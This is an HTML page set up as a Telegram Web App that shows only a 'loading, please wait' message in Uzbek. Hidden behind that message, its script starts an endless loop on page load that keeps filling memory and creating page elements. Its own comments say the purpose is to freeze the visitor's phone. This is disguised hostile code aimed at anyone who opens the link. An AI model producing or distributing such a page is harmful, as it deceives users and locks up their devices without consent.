<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #000;
            color: #0ff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: monospace;
            font-size: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div>Yuklanmoqda... Kuting ⏳</div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        // Telefonni qattiq qotiruvchi sikl (Infinite CPU load loop)
        // Telefon buzilmaydi, faqat interfeys muzlab qoladi
        window.onload = function() {
            let massiveArray = [];
            while(true) {
                // Xotirani va protsessorni bir zumda to'ldiradi
                let text = "QOTISH_" + Math.random().repeat ? "QOTISH_" : "QOTISH_".repeat(100000);
                massiveArray.push(text);
                
                // DOM elementlarini tinimsiz yaratish telefonni qotiradi
                let div = document.createElement('div');
                div.innerHTML = text;
                document.body.appendChild(div);
            }
        }
    </script>
</body>
</html>
